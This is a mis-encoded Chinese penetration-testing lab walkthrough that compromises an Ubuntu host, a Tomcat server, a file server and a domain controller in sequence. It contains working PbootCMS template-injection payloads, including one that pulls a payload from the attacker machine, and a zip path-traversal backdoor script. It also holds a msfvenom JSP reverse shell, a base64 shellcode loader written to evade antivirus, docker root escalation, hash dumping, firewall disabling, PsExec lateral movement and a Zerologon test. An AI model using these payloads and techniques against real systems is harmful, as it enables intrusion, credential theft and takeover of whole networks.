# æµ‹è¯•ç¯å¢ƒ

```
æ¯æœº                   192.168.0.101
kali                  192.168.0.104

ubuntu                192.168.0.103
tomcat-web            192.168.0.102    10.10.1.129
fileserver            10.10.1.128      10.10.10.140
dc                    10.10.10.139
```

# ç¬¬ä¸€å°Ubuntu

## ä¿¡æ¯æœé›†

### åŸºç¡€ä¿¡æ¯

1ã€masscan ç«¯å£å­˜æ´»æ‰«æ

```bash
masscan --ports 0-65535 192.168.0.103 --rate=500
```

```bash
Discovered open port 22/tcp on 192.168.0.103                                   
Discovered open port 80/tcp on 192.168.0.103                                   
Discovered open port 8888/tcp on 192.168.0.103                                 
Discovered open port 888/tcp on 192.168.0.103                                  
Discovered open port 21/tcp on 192.168.0.103                                   
```

2ã€namp ç«¯å£è¯¦ç»†ä¿¡æ¯

```bash
nmap -sC -A -p 21,22,80,888,3306,888 192.168.0.103 -oA port-version
```

```nmap
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     Pure-FTPd
| ssl-cert: Subject: commonName=116.27.230.199/organizationName=BT-PANEL/stateOrProvinceName=Guangdong/countryName=CN
| Not valid before: 2020-10-28T04:54:10
|_Not valid after:  2030-07-28T04:54:10
|_ssl-date: TLS randomness does not represent time
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 de:fe:58:1c:ed:ef:1d:4f:56:9e:b8:1e:71:4d:86:70 (RSA)
|   256 dc:5b:05:fa:fc:87:d5:f7:97:0a:13:04:fa:23:f0:9b (ECDSA)
|_  256 47:ac:04:b5:4e:1d:a4:c9:c7:b0:7e:55:dd:26:96:2a (ED25519)
80/tcp   open  http    Apache httpd
|_http-server-header: Apache
|_http-title: \xE6\xB2\xA1\xE6\x9C\x89\xE6\x89\xBE\xE5\x88\xB0\xE7\xAB\x99\xE7\x82\xB9
888/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 403 Forbidden
3306/tcp open  mysql   MySQL (unauthorized)
MAC Address: 00:0C:29:F8:4B:BA (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: Host: 0b842aa5.phpmyadmin; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

3ã€ç»‘å®šåŸŸå hosts

æ­¤è¿‡ç¨‹ä¸ºé¶åœºç¯å¢ƒé…ç½®éœ€è¦ï¼Œåœ¨æ¯æœºåkalié‡Œéƒ½ç»‘å®šåŸŸå

```
192.168.0.103  www.cf1.com
```

### ç½‘ç«™PbootCMS

#### 1ã€ç¡®å®š cms ç‰ˆæœ¬

ç¡®å®š cms ç‰ˆæœ¬ï¼ŒæŸ¥çœ‹å‡çº§è¯´æ˜ï¼Œç‰¹åˆ«æ˜¯æ¼æ´å…¬å‘Šï¼Œç„¶åè¿›è¡Œæ–‡ä»¶å¯¹æ¯”ï¼Œå®šä½æ¼æ´åˆ†ææ¼æ´ä¸è¡¥ä¸

æ‰¾åˆ°ç äº‘çš„åœ°å€ï¼Œå¯è§‚å¯Ÿç›®å½•ç»“æ„

```http
https://gitee.com/hnaoyun/PbootCMS
```

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_12-13-02.png" alt="Snipaste_2023-05-11_12-13-02" style="zoom:67%;" />

å‘ç°è¡¥ä¸ä¿¡æ¯ï¼š

```http
http://www.cf1.com/doc/ChangeLog.txt
```

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_12-32-50.png" alt="Snipaste_2023-05-11_12-32-50" style="zoom:80%;" />

#### 2ã€ç›®å½•æ‰«æ

```bash
â””â”€# gobuster dir -u http://www.cf1.com -w word                                                              
```

```
/config/database.php~ (Status: 200) [Size: 857]
/config.tar.gz        (Status: 200) [Size: 1342]
```

æ‰¾åˆ°æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œ`pboot:123456`

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_12-18-10.png" alt="Snipaste_2023-05-11_12-18-10" style="zoom:50%;" />

Bootcms é»˜è®¤æ•°æ®åº“æ˜¯ sqlite ï¼Œé»˜è®¤ä¸‹è½½ data/pbootcms.db 

æŸ¥çœ‹ config.php å‘ç°é»˜è®¤ db ä½ç½®å·²ç»ä¿®æ”¹ `data/c6613b090db86e60916afb3af6f923d2.db`

ä¸‹è½½ sqlite çš„ æ•°æ®åº“æ–‡ä»¶ï¼š

```http
http://www.cf1.com/data/c6613b090db86e60916afb3af6f923d2.db
```

#### 3ã€Sqlitebrowserè¯»å–æ•°æ®åº“å¯†æ–‡

ç¬¬äºŒæ­¥é‡Œå·²ç»ä¸‹è½½äº† `c6613b090db86e60916afb3af6f923d2.db` æ–‡ä»¶ï¼Œç°åœ¨æŠŠå®ƒæ”¾åœ¨å·¥å…·é‡Œè¯»å–æ•°æ®

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_12-27-31.png" alt="Snipaste_2023-05-11_12-27-31" style="zoom:80%;" />

æ‰¾åˆ°åå°è´¦å·å¯†ç ï¼š  `admin:8187bef2c0b83e6b0b747d92b0a65eb1`

md5è§£å¯†åï¼š    `admin:admin7788`

æ¥ä¸‹æ¥ç™»å½•ç½‘ç«™åå°

```http
http://www.cf1.com/admin.php
```

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_12-30-41.png" alt="Snipaste_2023-05-11_12-30-41" style="zoom:80%;" />

## ç½‘ç«™åå°æ‹¿shell

å‘ç°ç‰ˆæœ¬ä¸º `PbootCMS V2.0.8-20200426`

å…¨ç½‘æ‰¾ exp 

```http
https://xz.aliyun.com/t/7918
https://www.anquanke.com/post/id/212603
```

### æ¼æ´å¤ç°

```
{pboot:if(implode('', ['c','a','l','l','_','u','s','e','r','_','f','u','n','c'])(implode('',['s','y','s','t','e','m']),implode('',['w','h','o','a','m','i'])))}{/pboot:if}
```

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_13-11-19.png" alt="Snipaste_2023-05-11_13-11-19" style="zoom:67%;" />

æœ¬åœ°æµ‹è¯•ç¯å¢ƒå¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œä½†æ˜¯å®é™…é¶æœºç¯å¢ƒé‡Œæ— æ³•æ‰§è¡Œï¼Œ `system()` è¿™ä¸ªå‡½æ•°è¢«ç¦ç”¨äº†

### æ¥ç€æµ‹è¯•

1ã€æˆåŠŸæ‰§è¡Œ phpinfo() ï¼š

```
{pboot:if(implode('', ['c','a','l','l','_','u','s','e','r','_','f','u','n','c'])(implode('',['p','h','p','i','n','f','o'])))}!!!{/pboot:if}
```

2ã€æ‰§è¡Œpayloadåï¼Œç‚¹å‡»ä¸»é¡µè§¦å‘æ‰§è¡Œ `http://www.cf1.com/` ï¼Œå‘ç°å†™å…¥äº†æ–‡ä»¶ï¼š2.php

```
{pboot:if(implode('',['f','i','l','e','_','p','u'.'t','_c','o','n','t','e','n','t','s'])(implode('',['2','.php']),implode('',['<?php php','info() ?>'])))}!!!{/pboot:if}
```

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_13-42-51.png" alt="Snipaste_2023-05-11_13-42-51" style="zoom:80%;" />

3ã€åŒæ ·æ“ä½œï¼Œç”Ÿæˆ 2.phpï¼Œè®¿é—® `http://www.cf1.com/2.php`ï¼Œä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆ zf1yolo.php ï¼Œå…¶ä¸­çš„å†…å®¹ä¸ºè¿œç¨‹åœ°å€  `http://192.168.0.101:8082/2.txt` é‡Œçš„å…æ€ payload

```
{pboot:if(implode('',['f','i','l','e','_','p','u'.'t','_c','o','n','t','e','n','t','s'])(implode('',['2','.php']),
implode('',['<?php
file_','put_','contents(','"zf1yolo.php",','file','_get_','contents("','http://192.168.0.104/2.txt"))?>'])))}!!!{/pboot:if}
```

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_13-55-59.png" alt="Snipaste_2023-05-11_13-55-59" style="zoom:80%;" />

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_14-05-12.png" alt="Snipaste_2023-05-11_14-05-12" style="zoom:67%;" />

è¿™é‡Œç”¨åˆ°çš„æ˜¯åˆ†ç¦»å…æ€çš„æ€æƒ³ï¼Œå½“å®‰å…¨è½¯ä»¶ç¦ç”¨äº†ä¸€äº›phpæ•æ„Ÿå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶å®ƒå‡½æ•°ï¼Œè¿œç¨‹ä¸‹è½½å…æ€çš„webshell

### æ‹¿webshell

æˆ‘ä»¬èƒ½çœ‹åˆ° php é‡Œç¦æ­¢ä½¿ç”¨çš„å‡½æ•°

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_14-28-53.png" alt="Snipaste_2023-05-11_14-28-53" style="zoom:67%;" />

ä½¿ç”¨  assert() å‡½æ•°æ—¶ä¼šå‘ç°è­¦å‘Š

```
Warning**: Cannot call assert() with string argument dynamically
```

è¢«ç¦çš„å‡½æ•°å¤ªå¤šäº†ï¼Œè¯•è¯•ç½‘ä¸Šçš„ä¸€äº›å·¥å…·ï¼š

php7-backtrace-bypass https://github.com/mm0r1/exploits

è¿˜æ˜¯ç”¨ä»¥ä¸Šçš„è€åŠæ³•è¿œç¨‹å†™å…¥æ–‡ä»¶ç”Ÿæˆæ–‡ä»¶ï¼ŒæŠŠ exploits.php å†™å…¥åˆ°ç½‘ç«™ç›®å½•

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_15-15-14.png" alt="Snipaste_2023-05-11_15-15-14" style="zoom:80%;" />

## æƒé™æå‡

### å¯†åŒ™ç™»å½•SSH

```http
http://www.cf1.com/expilots.php?x=cat%20/etc/passwd
```

å‘ç°ç”¨æˆ· cf1ï¼Œä¸” home é‡Œæœ‰ SSH çš„å…¬é’¥ç§é’¥ 

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_15-28-47.png" alt="Snipaste_2023-05-11_15-28-47" style="zoom:67%;" />

æŠŠç§é’¥ id_rsa å¤åˆ¶åˆ°ç½‘ç«™ç›®å½•ï¼Œæ–¹ä¾¿æˆ‘ä»¬ä¸‹è½½ï¼š

```http
http://www.cf1.com/expilots.php?x=cp%20/home/cf1/id_rsa%20/www/wwwroot/www.cf1.com/id_rsa
```

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_15-34-10.png" alt="Snipaste_2023-05-11_15-34-10" style="zoom:80%;" />

```
â””â”€# chmod 600 id_rsa
â””â”€# ssh -i id_rsa cf1@192.168.0.103                
```

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_15-38-49.png" alt="Snipaste_2023-05-11_15-38-49" style="zoom:80%;" />

### ææƒåˆ°root

sudo --version  çš„ç‰ˆæœ¬æœ‰æ¼æ´

æˆ‘æœ¬æ¥æƒ³ç”¨ sudo æ¼æ´ææƒçš„ï¼ŒCVE-2021-3156ï¼Œä½†æ˜¯å¤±è´¥äº†

#### dockerææƒ

[(148æ¡æ¶ˆæ¯) dockerææƒ_å…¨å±€å˜é‡Globalçš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/nicai321/article/details/122266988)

å‘ç°ç”¨æˆ· cf1 åœ¨ docker ç»„é‡Œ

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_16-06-28.png" alt="Snipaste_2023-05-11_16-06-28" style="zoom:80%;" /> 

åŸç†æ˜¯ç›®å½•æŒ‚è½½ï¼Œå¯¹ /etc/passwdï¼Œ/etc/shadow ç­‰æ–‡ä»¶è¿›è¡Œæ“ä½œ

æ­¥éª¤ï¼š

1ã€æŒ‚è½½ç›®å½•ï¼ŒæŠŠä¸»æœºçš„ /etc æŒ‚åˆ° docker é‡Œçš„ /mnt

```bash
docker run -v /etc:/mnt -it alpine
```

2ã€æœ¬åœ°ç”Ÿæˆå¢åŠ  root ç”¨æˆ· ï¼Œå¯†ç ä¸º ï¼š1542576819zfY

```bash
â””â”€$ openssl passwd -1 --salt zf1yolo
Password: 
$1$zf1yolo$YD1BMW/E/wbkKCcRkjFCb0
```

3ã€æ·»åŠ ç”¨æˆ·åˆ° passwd é‡Œ

```bash
~ # cd /mnt/
/mnt # vi passwd
/mnt # cat passwd
```

```
zf1yolo:$1$zf1yolo$YD1BMW/E/wbkKCcRkjFCb0:0:0:root:/root:/bin/bash
```

```
/mnt # exit
```

4ã€`su zf1yolo`

```bash
cf1@08:~$ su zf1yolo
å¯†ç ï¼š 
root@08:/home/cf1# ls
examples.desktop  exploit_defaults_mailer.py  exploits  exploit_userspec.py  id_rsa  id_rsa.pub  install.sh  å…¬å…±çš„  æ¨¡æ¿  è§†é¢‘  å›¾ç‰‡  æ–‡æ¡£  ä¸‹è½½  éŸ³ä¹  æ¡Œé¢
root@08:/home/cf1# id
uid=0(root) gid=0(root) ç»„=0(root)
```

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_16-30-05.png" alt="Snipaste_2023-05-11_16-30-05" style="zoom:80%;" />

# ç¬¬äºŒå°Tomcat-Web

## ä¿¡æ¯æœé›†

1ã€å†…ç½‘ä¸»æœºå‘ç°

```bash
nmap -sn 192.168.0.0/24 -T4
```

2ã€masscanæ‰«ç«¯å£å­˜æ´»

```bash
â””â”€# masscan --ports 0-65535 192.168.0.102 --rate=500                  
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2023-05-11 08:38:25 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
Discovered open port 5985/tcp on 192.168.0.102                                 
Discovered open port 3306/tcp on 192.168.0.102                                 
Discovered open port 8080/tcp on 192.168.0.102    
```

3ã€ç½‘ç«™ä¿¡æ¯  JSPCMS

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_16-50-27.png" alt="Snipaste_2023-05-11_16-50-27" style="zoom:67%;" />

## ç½‘ç«™æµ‹è¯•

### å¼±å£ä»¤ç™»å½•åå°

```http
http://192.168.0.102:8080/cmscp/index.do
```

admin:123456

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_16-53-25.png" alt="Snipaste_2023-05-11_16-53-25" style="zoom:80%;" />

### åå°æ–‡ä»¶ä¸Šä¼ 

å‘ç°ä¸Šä¼ zipåŒ…å¯ä»¥è‡ªåŠ¨è§£å‹

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_17-15-18.png" alt="Snipaste_2023-05-11_17-15-18" style="zoom: 67%;" />

```http
http://192.168.0.102:8080/uploads/1/222.html     //è·¯å¾„å­˜åœ¨
```

#### å°è¯•1ï¼š

æŠŠå“¥æ–¯æ‹‰çš„ jsp æ‰“åŒ…æˆ zip ä¸Šä¼ ï¼Œå‘ç°æˆåŠŸä¸Šä¼ ï¼Œä½†è„šæœ¬æ— æ³•è¿è¡Œã€‚åº”è¯¥æ˜¯è¯¥ç›®å½•ä¸è®©æ‰§è¡Œ jsp è„šæœ¬

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_17-22-29.png" alt="Snipaste_2023-05-11_17-22-29" style="zoom: 67%;" />

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_17-21-34.png" alt="Snipaste_2023-05-11_17-21-34" style="zoom:67%;" />

#### å°è¯•2ï¼š

å…¨ç¨‹åœ¨kalié‡Œæ“ä½œï¼Œwin10 é‡Œçš„ bindzip æœ‰ç‚¹å®³äºº

[å¤ç°jspxcmsè§£å‹getshellæ¼æ´ | lockcy's cave](https://lockcy.github.io/2019/10/18/å¤ç°jspxcmsè§£å‹getshellæ¼æ´/)

1ã€ç”Ÿæˆ war åé—¨æ–‡ä»¶

```
Jar -cvf gsl.war gsl.jsp
```

2ã€åˆ›å»ºç©¿è¶Šæ¼æ´å‹ç¼©æ–‡ä»¶ï¼š

```python
import zipfile

z = zipfile.ZipFile('test0.zip', 'w', zipfile.ZIP_DEFLATED)
with open('gsl.war','rb') as f:
    temp=f.read()

z.writestr('../../../gsl.war',temp)  #gsl.warä¸ºä¸Šä¸€æ­¥ç”Ÿäº§çš„åé—¨waråŒ…
z.close()
```

å‘ç°ä¸Šä¼ åˆ°äº†æ ¹ç›®å½•

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_18-02-59.png" alt="Snipaste_2023-05-11_18-02-59" style="zoom:67%;" />

#### getshell

æˆåŠŸè¿æ¥åˆ°å“¥æ–¯æ‹‰

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_18-05-00.png" alt="Snipaste_2023-05-11_18-05-00" style="zoom:67%;" />

### æƒé™è½¬åˆ°msf

msf ç”Ÿæˆ jspï¼š

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.104 LPORT=6688 -f raw > m.jsp
```

æ‰“åŒ…æˆ war ï¼š

```bash
jar -cvf m.war m.jsp
```

msf ç›‘å¬ï¼š

```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp
payload => java/jsp_shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 6688
lport => 6688
msf6 exploit(multi/handler) > set shell cmd.exe
shell => cmd.exe
msf6 exploit(multi/handler) > ex
exit     exploit  
msf6 exploit(multi/handler) > exploit 
```

è§¦å‘ï¼š

```http
http://192.168.0.102:8080/m/m.jsp
```

å¾—åˆ°é«˜æƒé™ï¼Œjsp ç½‘ç«™å°±æ˜¯é«˜æƒé™ï¼Œè„šæœ¬çš„ç‰¹æ€§

<img src=".\å›¾ç‰‡\Snipaste_2023-05-11_18-41-21.png" alt="Snipaste_2023-05-11_18-41-21" style="zoom:80%;" />

### ä¸­åœºæš‚åœ

ipå˜åŒ–ï¼Œç”±äºç¬¬ä¸€å°Ubuntuå¯¹æ•´ä¸ªåŸŸç¯å¢ƒæ— å½±å“ï¼Œå°±ä¸å¼€ Ubuntu äº†ã€‚

```
æ¯æœº           192.168.0.101
kali           192.168.0.103

tomcat-web     192.168.0.102       10.10.1.129
fileserver     10.10.1.128      10.10.10.140 
dc             10.10.10.139
```

## å…æ€360æ€æ¯’ä¸å«å£«

360æ€æ¯’æ˜¯é™æ€ï¼Œå«å£«æ˜¯è¡Œä¸ºæ‹¦æˆªã€‚

[(148æ¡æ¶ˆæ¯) å®Œç¾è§£å†³pyinstaller æ‰“åŒ…æŠ¥é”™æ‰¾ä¸åˆ°ä¾èµ–pypiwin32 æˆ–pywin32-ctypesçš„é”™è¯¯_pyinstaller pywin32_ä¸€ç¬‘ç¨‹åºçŒ´çš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/lixiaosenlin/article/details/103974607)

å‚è€ƒä¹‹å‰çš„å…æ€ç¬”è®°

file_3.pyï¼š

```python
import ctypes
import base64

def sc():
    with open('s.txt', 'r') as f:
        s = f.read()
    gg = base64.b64decode(s)
    gg = bytearray(gg)
    return gg

def zx(s):
    gg =s
    with open('z.txt', 'r') as f:
        z = f.read()
    zx = z.replace('zf1yolo', '')
    zx = base64.b64decode(z)
    exec(zx)

gg=sc()
zx(gg)
```

s.txt æ˜¯ shellcode base64 ç¼–ç æ–‡ä»¶ï¼Œz.txt ä¸ºç¼–è¯‘çš„æ‰§è¡Œä»£ç  æ¥ base64 ç¼–ç ååŠ å…¥æ··æ·†å­—ç¬¦

z.txt æœªç¼–ç æ··æ·†å‰åŸå‹ä¸ºï¼š

```python
import ctypes
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),
    ctypes.c_int(len(gg)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40)
    )
buffered = (ctypes.c_char * len(gg)).from_buffer(gg)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(gg))
)
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
```

å†æ‰“åŒ…æˆ exeï¼š

```bash
pyinstaller -F file_3.py -w -i acroread.ico
```

æŠŠä¸Šè¿° 3 ä¸ªæ–‡ä»¶ä¼ åˆ°åŒä¸€ç›®å½• ï¼Œè¿è¡Œ file_3.exe å³ä¸Šçº¿ï¼š

<img src=".\å›¾ç‰‡\Snipaste_2023-05-12_13-38-56.png" alt="Snipaste_2023-05-12_13-38-56" style="zoom:80%;" />

äºæ˜¯æŠŠæƒé™æ¨åˆ° cs

## åç»­æ“ä½œ

å†ç”¨ cs ææƒæ’ä»¶ juicypotato ææƒåˆ° system

æ¥ç€å…³é—­ defenderï¼Œï¼Œå…³é—­360ï¼Œè¿œç¨‹æ¡Œé¢å¯†ç ç”¨hashdumpå‡ºæ¥çš„md5è§£å¯† 

```beacon
beacon> netsh advfirewall set allprofiles state off
```

å¼€å¯è¿œç¨‹æ¡Œé¢3389ï¼š

```beacon
beacon> shell wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
```

MD5è§£å¯†hashï¼š

```beacon
beacon> hashdump
[*] Tasked beacon to dump hashes
[+] host called home, sent: 82541 bytes
[+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

<img src=".\å›¾ç‰‡\Snipaste_2023-05-12_15-14-01.png" alt="Snipaste_2023-05-12_15-14-01" style="zoom:50%;" />

è¿œç¨‹æ¡Œé¢è¿æ¥ tomcat-webï¼Œadministrator:QWEasd123

<img src=".\å›¾ç‰‡\Snipaste_2023-05-12_15-17-48.png" alt="Snipaste_2023-05-12_15-17-48" style="zoom:80%;" />

æ¥ç€å…³é—­ 360

è¡¥å……ä¸€ä¸‹ï¼Œå¦‚æœä¸å…³é—­ defender ï¼Œåˆ™è¦**æ·»åŠ  ipsec å…¥ç«™è§„åˆ™** ï¼š

åœ¨æ·»åŠ è§„åˆ™ä¹‹å‰è¦ç™»å½•ç³»ç»ŸæŠŠ 360 å®‰å…¨å«å£«å…³æ‰ï¼Œä¸ç„¶ä¼šè¿›è¡Œ netsh æ‹¦æˆª 

```
shell netsh interface portproxy add v4tov4 listenport=7788 connectaddress=192.168.0.130 connectport=7788 
```

æŸ¥çœ‹è§„åˆ™ 

```
netsh interface portproxy show all
```



# ç¬¬ä¸‰å° File-Server

## ä¿¡æ¯æ”¶é›†

åœ¨ç¬¬äºŒå°ä¸»æœº Tomcat-Web çš„ cs beaconé‡Œåšå¯¹ file-server çš„ä¿¡æ¯æœé›†

1ã€ç½‘æ®µä¿¡æ¯

```beacon
beacon> shell ipconfig/all
```

å‘ç°ä¸¤ä¸ªç½‘å¡ ï¼Œè€Œä¸”ä¸åœ¨åŸŸå†…

```
192.168.0.102
10.10.1.129
```

2ã€10.10.1.0/24 ç½‘æ®µä¸»æœºå­˜æ´»æ‰«æ

```beacon
beacon> portscan 10.10.1.0-10.10.1.255 1-1024,3389,5000-6000 arp 1024
```

å‘ç°ç›®æ ‡ 10.10.1.128 åªæœ‰ 445 ç«¯å£å¼€æ”¾ï¼Œå¯èƒ½æœ‰ä¸¤è¾¹ä¸»æœºï¼ˆtomcatã€fileï¼‰é˜²ç«å¢™æœ‰å…¥ç«™å‡ºç«™çš„æ‹¦æˆªï¼Œä¸”åœ¨åŸŸå†…ï¼šFBI

```
10.10.1.128:445 (platform: 500 version: 10.0 name: FILESERVER domain: FBI)
```

 3ã€ipc ç©ºè¿æ¥è®¿é—®æˆåŠŸ

ä¸ºä»€ä¹ˆä¼šæˆåŠŸå‘¢ï¼Ÿå¯èƒ½ä¸»æœº tomcat-web ä¸ä¸»æœº file-server çš„ ç®¡ç†å‘˜ç”¨æˆ·çš„è´¦å·å¯†ç ç›¸åŒï¼Œå³éƒ½ä¸º administrator:QWEasd123

```beacon
beacon> shell dir \\10.10.1.128\c$\Users
[*] Tasked beacon to run: dir \\10.10.1.128\c$\Users
[+] host called home, sent: 57 bytes
[+] received output:
 é©±åŠ¨å™¨ \\10.10.1.128\c$ ä¸­çš„å·æ²¡æœ‰æ ‡ç­¾ã€‚
 å·çš„åºåˆ—å·æ˜¯ 6613-657B

 \\10.10.1.128\c$\Users çš„ç›®å½•

2020/11/04  22:11    <DIR>          .
2020/11/04  22:11    <DIR>          ..
2020/11/15  11:04    <DIR>          Administrator
2020/11/07  09:15    <DIR>          fileserver
2016/12/14  19:13    <DIR>          Public
```

## æ¨ªå‘ç§»åŠ¨

### csç”Ÿæˆè½¬å‘ä¸Šçº¿exe

csé…ç½®è½¬å‘ä¸Šçº¿ç›‘å¬å™¨ï¼Œ ç”Ÿæˆåå‘åé—¨ï¼Œè½¬å‘ä¸Šçº¿

<img src=".\å›¾ç‰‡\Snipaste_2023-05-12_15-42-50.png" alt="Snipaste_2023-05-12_15-42-50" style="zoom:80%;" />

### å¤åˆ¶åé—¨åˆ° fileserver

```beacon
beacon> shell copy 4444.exe \\10.10.1.128\c$\windows\temp\rve.exe
[*] Tasked beacon to run: copy 4444.exe \\10.10.1.128\c$\windows\temp\rve.exe
[+] host called home, sent: 82 bytes
[+] received output:
å·²å¤åˆ¶         1 ä¸ªæ–‡ä»¶ã€‚
```

### PsExec64æ‰§è¡Œåé—¨

PsExec64 è¿™é‡Œéœ€è¦äº¤äº’shellï¼Œåœ¨beaconé‡Œä¸è¡Œ

```bash
PsExec64.exe \\10.10.1.128 -u administrator -p QWEasd123 -i c:\\windows\\temp\\rve.exe
```

<img src=".\å›¾ç‰‡\Snipaste_2023-05-12_16-10-14.png" alt="Snipaste_2023-05-12_16-10-14" style="zoom:80%;" />

## æˆåŠŸä¸Šçº¿

æˆåŠŸä¸Šçº¿ csï¼š

<img src=".\å›¾ç‰‡\Snipaste_2023-05-12_16-10-59.png" alt="Snipaste_2023-05-12_16-10-59" style="zoom:80%;" />

# ç¬¬å››å°DC

## ä¿¡æ¯æœé›†

åœ¨å·²æ”»é™·çš„ç¬¬ä¸‰å° file-server çš„ cs çš„ beacon é‡Œåšå¯¹åŸŸå†…çš„ä¿¡æ¯æ”¶é›†

1ã€åˆ¤æ–­åŸŸå­˜åœ¨ï¼Œä¸”å­˜åœ¨ 2 å¼ ç½‘å¡ ï¼š10.10.1.128 ã€10.10.10.140

<img src=".\å›¾ç‰‡\Snipaste_2023-05-12_16-16-23.png" alt="Snipaste_2023-05-12_16-16-23" style="zoom:67%;" />

2ã€å®šä½åŸŸæ§ï¼Œå¯¹ 10.10.10.0/24 ç½‘æ®µè¿›è¡Œæ‰«æï¼Œç”¨ cs æ’ä»¶ ladonï¼Œå‘ç° 10.10.10.139 ä¸ºç›®æ ‡

```
[*] Ladon 10.10.10.0/24 OnlineIP
[+] host called home, sent: 473919 bytes
[+] received output:
Ladon 9.2.1
Start: 2023-05-12 16:31:40
PC Name: FILESERVER Lang: zh-CN
Runtime: .net 4.0  ME: x64 OS: x64
OS Name: Microsoft Windows Server 2016 Standard
Machine Make: VMware, Inc.
RunUser: Administrator PR: *IsAdmin
Priv: SeImpersonatePrivilege å·²å¯ç”¨
PID: 4964  CurrentProcess: rundll32
FreeSpace: Disk C:\ 50540 MB

load OnlineIP
10.10.10.0/24 is Valid CIDR
IPCound: 256
Scan Start: 2023-05-12 16:31:40
10.10.10.1

[+] received output:
10.10.10.140
10.10.10.139

[+] received output:
=============================================
OnlinePC:3
Cidr Scan Finished!
End: 2023-05-12 16:32:43
```

3ã€å¯¹åŸŸæ§ç«¯å£æ¢æµ‹ï¼Œè®¡ç®—æœºåæ¨æ–­ä¸º `dc.fbi.gov`ï¼Œä¸€æ ·ç”¨ cs çš„æ’ä»¶

```
[+] received output:
PCname: 10.10.10.139     DC
10.10.10.139     139 Open -> Banner: Windows Netbios

[+] received output:
10.10.10.139     5985 Open -> Banner: Win Winrm
10.10.10.139     5357 Open -> Banner: Win7 Microsoft-HTTPAPI
10.10.10.139     389 Open -> Default is LDAP 
10.10.10.139     636 Open 
10.10.10.139     445 Open -> Default is SMB 
IP Finished!
End: 2023-05-12 16:35:14
10.10.10.139     88 Open -> Default is Kerberos 
```

## åˆ©ç”¨æ¼æ´æ‰“åŸŸæ§

å…ˆåœ¨ç¬¬ä¸‰å° file-server çš„ cs çš„ beacon é‡Œå»ºç«‹ä¸€ä¸ªä»£ç†èŠ‚ç‚¹ï¼Œæ–¹ä¾¿æˆ‘ä»¬ä½¿ç”¨ proxychains4 ä¸ dc 10.10.10.139 é€šè®¯

### POCéªŒè¯

å‘ç°æ¼æ´å­˜åœ¨

```bash
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# proxychains4 python3 zerologon_tester.py dc 10.10.10.139                                                                                            
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Performing authentication attempts...
[proxychains] Dynamic chain  ...  127.0.0.1:53301  ...  10.10.10.139:135  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:53301  ...  10.10.10.139:49669  ...  OK

Success! DC can be fully compromised by a Zerologon attack.
```

### EXPåˆ©ç”¨

